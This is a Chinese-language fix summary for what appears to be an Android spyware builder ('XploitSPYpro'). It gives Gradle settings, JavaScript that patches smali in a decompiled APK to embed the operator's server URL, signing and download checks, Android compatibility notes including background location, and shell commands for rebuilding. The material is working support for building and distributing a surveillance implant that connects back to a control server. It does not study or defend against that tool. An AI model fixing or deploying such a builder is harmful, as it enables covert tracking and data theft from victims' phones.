# 稳定性修复汇总

## 核心问题修复

### 1. 禁用 ProGuard 混淆 (build.gradle)
```gradle
buildTypes {
    release {
        minifyEnabled false      // 原为 true
        shrinkResources false      // 原为 true
        debuggable false
    }
}
```
**原因**: ProGuard 会混淆代码，导致 Socket.IO 和其他依赖库的反射调用失败，造成运行时崩溃。

### 2. 修复 Smali 寄存器号问题 (apkBuilder.js)
**原代码问题**: 硬编码 `const-string v2, ...`，可能改变原始寄存器号
```javascript
// 错误：硬编码 v2
return `const-string v2, "${serverUrl}${originalQuery}`;

// 修复：保留原始寄存器号
return `${prefix}${serverUrl}${originalQuery}`;
```
**原因**: Smali 字节码中寄存器号必须与原代码匹配，否则会导致运行时错误。

### 3. 保留原始查询参数 (apkBuilder.js)
```javascript
result = data.replace(/(const-string v\d+, ")http:\/\/[^\/"]+/, (match, prefix) => {
    const urlPart = match.substring(prefix.length);
    const queryIndex = urlPart.indexOf('?');
    const originalQuery = queryIndex >= 0 ? urlPart.substring(queryIndex) : '';
    return `${prefix}${serverUrl}${originalQuery}`;
});
```
**原因**: URL 中的 `?model=` 等参数必须在修补后保留，否则会导致 Socket 连接 URL 格式错误。

## 服务器端更新步骤

```bash
# 1. 拉取最新代码
cd /home/XploitSPYpro20260510-main
git pull

# 2. 测试构建（可选）
cd server
node ../test-build.js YOUR_IP 8080

# 3. 启动服务
PORT=8080 node index.js
```

## 验证构建成功的方法

1. **Web 界面点击 Build 后**，观察服务器日志：
   - 应显示 `[DEBUG] 找到目标文件: ...`
   - 应显示 `[DEBUG] 使用模式: const-string`
   - 应显示 `APK签名成功`
   - 应显示 `签名后APK大小: XXX 字节`

2. **下载 APK 后验证**:
   - 文件大小应 > 350KB
   - 能用压缩软件打开（ZIP格式有效）
   - 安装时不再提示"安装包解析出错"

## Android 版本兼容性

| 版本 | 状态 | 说明 |
|------|------|------|
| Android 5.0-9.0 (API 21-28) | ✅ 兼容 | 基础功能正常 |
| Android 10-13 (API 29-33) | ✅ 兼容 | 需申请后台定位权限 |
| Android 14 (API 34) | ✅ 兼容 | 前台服务类型已声明 |

## 如果仍然闪退

1. **检查服务器日志**是否有 `[DEBUG]` 输出
2. **确认 git pull 成功**: `git log --oneline -1` 应显示最新提交
3. **尝试清除缓存后重新构建**:
   ```bash
   rm -rf server/app/factory/decompiled
   rm -f server/assets/webpublic/*.apk
   ```
4. **检查目标 smali 文件**是否包含正确的 URL:
   ```bash
   grep -r "http://" server/app/factory/decompiled/smali/
   ```
